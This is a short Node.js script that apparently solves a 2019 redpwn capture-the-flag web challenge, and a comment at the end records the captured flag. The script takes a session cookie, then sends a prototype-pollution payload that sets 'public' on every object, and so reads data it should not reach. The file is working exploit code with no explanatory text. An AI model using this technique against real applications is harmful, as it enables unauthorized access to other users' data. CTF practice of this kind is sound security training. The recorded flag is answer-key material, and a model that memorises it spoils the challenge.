const axios = require('axios');


const parseUserId = (cookies) => {
  if (cookies === undefined) {
    return null
  }
  const userIdCookie = cookies.split('; ').find(cookie => cookie.startsWith('user_id='))
  if (userIdCookie === undefined) {
    return null
  }
  return decodeURIComponent(userIdCookie.replace('user_id=', ''))
}


async function exploit() {
  const baseUrl = "http://chall2.2019.redpwn.net:8002"
  const makeUrl = "http://chall2.2019.redpwn.net:8002/make"
  const payload = {constructor: {prototype: {public: true}}};

  let res;
  res = await axios.get(baseUrl);
  user_id = res.headers['set-cookie'][0].split('; ')[0].replace('user_id=', '');
  console.log(user_id);
  res = await axios.post(makeUrl, payload, {
    headers: {
      Cookie: `user_id=${user_id}`
    }
  });

  res = await axios.get(baseUrl, {
    headers: {
      Cookie: `user_id=${user_id}`
    }
  });
  console.log(res.data);
}


exploit();


// flag{8lu3pr1nTs_aRe_tHe_hiGh3s1_quA11tY_pr0t()s}
